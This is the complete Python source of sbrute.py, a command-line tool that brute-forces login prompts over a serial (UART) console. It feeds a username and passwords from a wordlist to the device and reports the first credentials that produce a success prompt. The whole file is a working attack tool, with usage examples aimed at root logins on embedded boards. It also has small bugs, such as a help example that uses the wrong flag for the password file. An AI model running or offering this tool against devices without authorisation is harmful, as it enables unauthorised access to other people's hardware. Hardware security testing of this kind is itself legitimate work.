#
#   This is the Brute Forcing Program for Serial Connections such as UART.
#       Program Name:               sbrute.py
#       Program Version Number:     1.0
#       Author(s):                  ab@merimetso.net
#       Date:                       31st October 2020
#
#
import serial
import sys
#
# This is the function that prints/displays the help/user-manual for the program.
#
def usage():
    print("\nProgram: sbrute.py - Version: 1.0 - Author: ab@merimetso.net - Date: 2020/10/21")
    print("")
    print("USAGE: sbrute.py [-h] [-d device] [-b baudrate] [-u username] [-f passwordfile]")
    print("                 [-v] [ -s loginsuccessstring] [-l usernameprompt] ")
    print("                 [-p passwordprompt] [-t timeoutvalue]")
    print("")
    print(" Optional Arguments:")
    print("    -h    Show this help message and exit.")
    print("    -d    This is the serial device to connect to. The default is:/dev/USB0")
    print("    -b    This is the baud rate to be used. The default is: 115200")
    print("    -f    This is the password file to be used. The default is: pass.txt")
    print("    -l    This is string that defines the username logon prompt.")
    print("              The default is 'Login:'")
    print("    -p    This is string that defines the login password prompt. The default")
    print("              is 'Password:'")
    print("    -s    This is string that defines a successful login. The default value:")
    print("              is 'admin@localhost$'")
    print("    -t    This is the timeout value for the serial connection. The default")
    print("              value is 1.")
    print("    -u    This is the username that is to be used for the brute forcing.")
    print("              The default value is: admin")
    print("    -v    This is verbose reporting. By default this is turned: OFF.")
    print("")
    print(" Example Usage:")
    print("    $ sbrute.py -d /dev/ttyACM0 -b 115200 -u root -p default.txt -t 1")
    print("    or")
    print("    $ sbrute.py -d /dev/ttyACM0 -s 'root@beaglebone$' -u root")
    sys.exit(0)
#
# This is the main function that performs the brute forcing function against a serial connection.
#
def main():
    # Open the serial connection to the device.
    ser = serial.Serial()
    try:
        ser.port = device
        ser.baudrate = baudrt
        ser.timeout = timout
        ser.open()
        ser.write("\n".encode())
        if verbos:
            print('[OK].............Opening Serial Device      : ' + str(device))
            print('                    +-----------> Baud Rate : ' + str(baudrt))
            print('                    +-----------> TimeOut   : ' + str(timout))
    except:
        print("ERROR: There has been an error trying to configure and open the device: " + str(device))
        sys.exit(1)
    #
    try:
        file = open(psfile, "r")
        if verbos: print('[OK].............Opening Password File: ' + str(psfile) + "\n")
    except:
        print("ERROR: There has been an error trying to open the password file: " + str(device))
        sys.exit(1)
    #
    password =""
    fn = file.readlines()
    fn.append('\n')
    for word in fn:
        while True:
            reading = ser.readline()
            if reading.decode()[:-1] == sussst:
                print("*** Success: Username: " + str(usernm) + " // Password:" + str(password) + "\n")
                ser.write("exit".encode())
                ser.flush()
                sys.exit(1)
            if reading.decode()[:-1] == userst:
                username = usernm + "\n"
                username = username.encode()
                ser.write(username)
                ser.flush()
            elif reading.decode()[:-1] == passst:
                password = word
                ser.write(word.encode())
                ser.flush()
                if verbos:
                    print("Authenticating with Username: " + str(usernm) + " and Password: " + str(word))
                break
            else:
                ser.flush()
#
# This function is used to parse parameters in the command line and return True/False, plus
# their position in the command line list: sys.argv
#
def member(argList, member):
    counter = 0
    for item in argList:
        if argList[counter] == member: return True, counter
        counter = counter + 1
    return False, -1
#
# This is the element of the program that processes the command line and then invokes the main() function.
#
if __name__ == "__main__":
    #
    usernm = "admin"
    device = "/dev/USB0"
    baudrt = 115200
    psfile = "pass.txt"
    verbos = False
    userst = "Login:"
    passst = "Password:"
    sussst = "admin@localhost"
    timout = 1
    #
    if len(sys.argv) == 1: main()
    if sys.argv[0] != "sbrute.py":
        usage()
    else:
        sys.argv.pop(0)
    #
    memTruth, index = member(sys.argv, '-h')
    if memTruth:
        usage()
        sys.argv.pop(index)
    #
    try:
        memTruth, index = member(sys.argv, '-v')
        if memTruth:
            verbos = True
            sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-v" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-d')
        if memTruth:
            sys.argv.pop(index)
            device = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-d" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
        #
    try:
        memTruth, index = member(sys.argv, '-b')
        if memTruth:
            sys.argv.pop(index)
            baudrt = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-b" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-f')
        if memTruth:
            sys.argv.pop(index)
            psfile = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-f" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-l')
        if memTruth:
            sys.argv.pop(index)
            userst = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-l" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-p')
        if memTruth:
            sys.argv.pop(index)
            passst = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-p" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
        #
    try:
        memTruth, index = member(sys.argv, '-s')
        if memTruth:
            sys.argv.pop(index)
            sussst = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-s" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-t')
        if memTruth:
            sys.argv.pop(index)
            timout = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-t" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
    #
    try:
        memTruth, index = member(sys.argv, '-u')
        if memTruth:
            sys.argv.pop(index)
            usernm = sys.argv.pop(index)
    except:
        print('ERROR: Error processing "-u" argument in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(0)
        #
    if len(sys.argv) == 0:
        print("\nRunning Serial Brute Forcing Too - Version: 1.0 - Author:ab@merimetso.net\n")
        main()
        sys.exit(1)
    else:
        print('ERROR: There is an illegal parameter in the command line.')
        print('       If you need to see the help page then use the "-h" option.\n')
        sys.exit(1)

    #
#
#
#   The end of the program - Last updated 31st Oct 2020 - ab@merimetso.net
#
#